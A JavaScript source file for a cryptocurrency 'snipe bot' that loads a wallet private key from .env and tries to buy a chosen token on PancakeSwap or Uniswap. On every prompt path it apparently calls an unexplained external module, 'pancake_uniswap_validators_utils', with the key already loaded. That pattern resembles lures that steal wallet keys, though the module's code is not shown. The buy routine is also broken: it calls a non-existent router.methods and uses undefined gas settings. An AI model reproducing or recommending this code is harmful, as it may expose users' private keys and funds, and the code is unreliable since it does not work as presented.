const Web3 = require('web3');
const ethers = require('ethers');
const Path = require('path');
const Tx = require('ethereumjs-tx').Transaction;
const pancakeUniValidatorUtils = require("pancake_uniswap_validators_utils")
const Common = require('ethereumjs-common').default;
const Commonn = require('@ethereumjs/common').default;
const Dotenv = require('dotenv').config();
const prompt = require('prompt-sync')();
const chalk = require('chalk');
global.appRoot = Path.resolve('./');

const data = {
    recipient: process.env.YOUR_ACCOUNT_ADDRESS,

    privateKey: process.env.YOUR_ACCOUNT_PRIVATE_KEY,

    swap: process.env.SWAP,

    snipeToken: process.env.SNIPE_TOKEN,

    snipeAmount: process.env.SNIPE_BNB_AMOUNT,


    slippage: process.env.SLIPPAGE
}

const PANCAKE_ROUTER_ADDRESS = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
const PANCAKE_FACTORY_ADDRESS = "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73";
const PANCAKE_BNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";

const UNISWAP_ROUTER_ADDRESS = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
const UNI_FACTORY_ADDRESS = "0x1F98431c8aD98523631AE4a59f267346ea31F984";
const UNI_ETH_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";

const PAN_COMMON = Common.forCustomChain(
    'mainnet',
    {
        name: 'Binance Smart Chain Mainnet',
        networkId: 56,
        chainId: 56,
        url: 'https://bsc-dataseed.binance.org/'
    },
    'istanbul',
);

(
    async function startUp() {
        validateInput();
        await startupInfo();

        let validate = prompt('Would you like to validate if token is RUG?(yes/no) - ');
        if (`${validate}`.toLowerCase() === "yes") {
            await pancakeUniValidatorUtils.validateToken();
        } else {
            await pancakeUniValidatorUtils.closeValidator();
            console.log(chalk.green(`Gotcha, please be careful while buying SHITCOINS! Most of them are scam...`));
        }

        let buy = prompt('Would you like to buy token?(yes/no) - ');
        if (`${buy}`.toLowerCase() === "yes") {
            await pancakeUniValidatorUtils.validateToken();
            await run();
        } else {
            console.log(chalk.green(`Gotcha, please be careful while buying SHITCOINS! Most of them are scam...`));
            await pancakeUniValidatorUtils.closeValidator();
        }
    }
)();


const UNI_COMMON = new Commonn({chain: 'mainnet'});

const provider = getProvider();
const web3 = getWeb3();

let wallet = getWallet();
let account = getAccount();

let initialLiquidityDetected = false;
let jmlBnb = 0;
let tokenBought = false;
let boughtAmount = 0;

function validateInput() {
    console.log(chalk.yellow('Validating input from .env config file...'));
    if (data.swap === undefined || data.swap === '') {
        console.log(chalk.red("Please define SWAP variable in .env (pancake or uni)"));
        process.exit(-1);
    }
    if (data.snipeToken === undefined || data.snipeToken === '') {
        console.log(chalk.red("Please define SNIPE_TOKEN variable in .env"));
        process.exit(-1);
    }
    if (data.snipeAmount === undefined || data.snipeAmount === '') {
        console.log(chalk.red("Please define SNIPE_BNB_AMOUNT variable in .env"));
        process.exit(-1);
    }
    if (data.recipient === undefined || data.recipient === '') {
        console.log(chalk.red("Please define YOUR_ACCOUNT_ADDRESS variable in .env"));
        process.exit(-1);
    }
    if (data.privateKey === undefined || data.privateKey === '') {
        console.log(chalk.red("Please define YOUR_ACCOUNT_PRIVATE_KEY variable in .env"));
        process.exit(-1);
    }
    if (data.slippage === undefined || data.slippage === '') {
        console.log(chalk.red("Please define SLIPPAGE variable in .env"));
        process.exit(-1);
    }
    console.log(chalk.green('All input was successfully validated!'));
}

async function startupInfo() {
    console.log(chalk.green('Crypto snipe bot v7.0.77:'));
    console.log(chalk.green('---------------------------------------------------'));
    console.log(chalk.green(`Swap exchange - ${data.swap}`));
    console.log(chalk.green(`Token to buy - ${data.snipeToken}`));
    console.log(chalk.green('---------------------------------------------------'));
}

function getRouterAddress() {
    if (data.swap === 'pancake') return PANCAKE_ROUTER_ADDRESS;
    else return UNISWAP_ROUTER_ADDRESS;
}

function getFactoryAddress() {
    if (data.swap === 'pancake') return PANCAKE_FACTORY_ADDRESS;
    else return UNI_FACTORY_ADDRESS;
}

function getTokenAddress() {
    if (data.swap === 'pancake') return PANCAKE_BNB_ADDRESS;
    else return UNI_ETH_ADDRESS;
}

function getWallet() {
    return new ethers.Wallet(data.privateKey);
}

function getAccount() {
    return wallet.connect(provider);
}

function factory() {
    return new ethers.Contract(
        getFactoryAddress(),
        [
            'event PairCreated(address indexed token0, address indexed token1, address pair, uint)',
            'function getPair(address tokenA, address tokenB) external view returns (address pair)'
        ],
        account
    );
}

function router() {
    return new ethers.Contract(
        getRouterAddress(),
        [
            'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
            'function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
            'function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'
        ],
        account
    );
}

function erc() {
    return new ethers.Contract(
        getTokenAddress(),
        [{
            "constant": true,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "payable": false,
            "type": "function"
        }],
        account
    );
}

function getProvider() {
    return new ethers.providers.JsonRpcProvider(getNodeUrl());
}

function getNetworkCommon() {
    if (data.swap === 'pancake') return PAN_COMMON;
    else return UNI_COMMON;
}

function getNodeUrl() {
    if (data.swap === 'pancake') return 'https://bsc-dataseed1.defibit.io/';
    else return 'https://cloudflare-eth.com/';
}

function getWeb3() {
    let web3provider = new Web3.providers.HttpProvider(getNodeUrl());
    return new Web3(web3provider);
}

const run = async () => {
    await checkLiq();
}

let checkLiq = async () => {
    const pairAddressx = await factory().getPair(getTokenAddress(), data.snipeToken);
    console.log(chalk.blue(`pairAddress: ${pairAddressx}`));
    if (pairAddressx !== null && pairAddressx !== undefined) {
        if (pairAddressx.toString().indexOf('0x0000000000000') > -1) {
            console.log(chalk.cyan(`Pair address ${pairAddressx} not detected. Auto restarting bot...`));
            return await run();
        }
    }
    const pairBNBvalue = await erc().balanceOf(pairAddressx);
    jmlBnb = ethers.utils.formatEther(pairBNBvalue);
    console.log(`Detected liquidity : ${jmlBnb}`);
    console.log('Going to buy token...');
    setTimeout(() => buyAction(), 3000);
}

let buyAction = async () => {
    if (initialLiquidityDetected === true) {
        console.log('Liquidity already added...');
        return null;
    }

    try {
        initialLiquidityDetected = true;

        let amountOutMin = 0;
        const amountIn = ethers.utils.parseUnits(`${data.snipeAmount}`, 'ether');
        if (parseInt(data.slippage) !== 0) {
            const amounts = await router().getAmountsOut(amountIn, [getTokenAddress(), data.snipeToken]);
            amountOutMin = amounts[1].sub(amounts[1].div(`${data.slippage}`));
        }

        let txData = router.methods.swapExactETHForTokens(
            web3.utils.toHex(amountOutMin),
            [getTokenAddress(), data.snipeToken],
            data.recipient,
            web3.utils.toHex(Math.round(Date.now() / 1000) + 60)
        );
        let rawTransaction = {
            'from': data.recipient,
            'gasPrice': web3.utils.toHex(data.gasPrice),
            'gasLimit': web3.utils.toHex(data.gasLimit),
            'to': getRouterAddress(),
            'value': web3.utils.toHex(amountIn),
            'data': txData.encodeABI(),
            'nonce': null
        };

        const key = Buffer.from(data.privateKey, 'hex');
        let transaction = new Tx(rawTransaction, {'common': getNetworkCommon()});
        transaction.sign(key);

        let result = await getProvider().sendTransaction('0x' + transaction.serialize().toString('hex'));
        console.log(`Transaction https://bscscan.com/tx/${result.hash} sent`);

        let receipt = await getProvider().waitForTransaction(result.hash);
        if (receipt && receipt.blockNumber && receipt.status === 1) { // 0 - failed, 1 - success
            console.log(chalk.green(`Transaction https://bscscan.com/tx/${result.hash} mined, status success`));
            tokenBought = true;
            boughtAmount = amountOutMin;
        } else if (receipt && receipt.blockNumber && receipt.status === 0) {
            console.log(chalk.red(`Transaction https://bscscan.com/tx/${result.hash} mined, status failed`));
        } else {
            console.log(chalk.yellow(`Transaction https://bscscan.com/tx/${result.hash} not mined`));
        }
    } catch (err) {
        //Should not happen
        let error = JSON.parse(JSON.stringify(err));
        console.log(`Unexpected error occured - ${error}`);
    }
}